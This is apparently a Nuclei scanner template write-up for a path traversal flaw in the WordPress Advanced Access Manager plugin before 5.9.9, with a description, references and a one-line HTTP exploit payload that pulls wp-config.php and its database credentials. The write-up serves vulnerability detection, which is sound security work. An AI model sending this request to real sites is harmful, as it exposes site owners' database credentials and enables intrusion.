# Nuclei Template: WordPress Advanced Access Manager < 5.9.9 - Local File Inclusion
**Template ID:** advanced-access-manager-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`advanced-access-manager-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Advanced Access Manager versions before 5.9.9 are vulnerable to local file inclusion and allows attackers to download the wp-config.php file and get access to the database, which is publicly reachable on many servers.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?aam-media=wp-config.php
```

## References
- https://wpscan.com/vulnerability/9873
- https://id.wordpress.org/plugins/advanced-access-manager/
- https://wpscan.com/vulnerability/dfe62ff5-956c-4403-b3fd-55677628036b
